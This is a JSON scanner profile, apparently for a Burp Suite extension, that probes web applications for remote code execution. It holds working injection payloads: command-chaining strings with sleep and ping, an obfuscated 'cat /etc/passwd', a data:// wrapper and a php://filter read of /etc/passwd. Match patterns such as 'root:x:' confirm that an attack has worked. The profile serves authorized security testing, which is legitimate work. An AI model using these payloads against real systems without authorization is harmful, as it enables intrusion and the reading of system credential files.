[{"Name":"Remote_Code_Execution","Enabled":true,"Scanner":1,"Author":"@Xer0Days","Payloads":["phpinfo()","a\u003de; b\u003dt; c\u003dc; d\u003dp; e\u003da; f\u003ds; g\u003dw; h\u003dd; cat /$a$b$c/$d$e$f$f$g$h","data://text/plain;base64,cGhwaW5mbygpCg\u003d\u003d","php://filter/convert.base64-encode/resource\u003d/etc/passwd",";cat$u+/etc$u/passwd$u","sleep 5","$(sleep 5)","INJECTX;sleep 5","INJECTX;sleep 5","INJECTX|sleep 5","INJECTX||sleep 5","INJECTX \u0026\u0026 sleep 5","INJECTX|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\u0027 |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1 "],"Encoder":["URL-encode key characters"],"UrlEncode":true,"CharsToUrlEncode":" \u0026?\"\u003d#","Grep":["true,Or,$_SERVER","true,Or,Registered Stream Filters ","true,Or,INJECTX123","true,Or,root:x:"],"Tags":["All"],"PayloadResponse":false,"NotResponse":false,"TimeOut":"","isTime":false,"contentLength":"","iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"isurlextension":false,"NegativeUrlExtension":false,"MatchType":1,"RedirType":0,"MaxRedir":0,"payloadPosition":1,"payloadsFile":"","grepsFile":"","IssueName":"Remote_Code_Execution","IssueSeverity":"High","IssueConfidence":"Certain","IssueDetail":"","RemediationDetail":"","IssueBackground":"","RemediationBackground":"","Header":[],"VariationAttributes":[],"InsertionPointType":[18,65,32,36,7,1,2,6,33,5,35,34,64,0,3,4,37,127,65,32,36,7,1,2,6,33,5,35,34,64,0,3,4,37,127],"Scantype":0,"pathDiscovery":false}]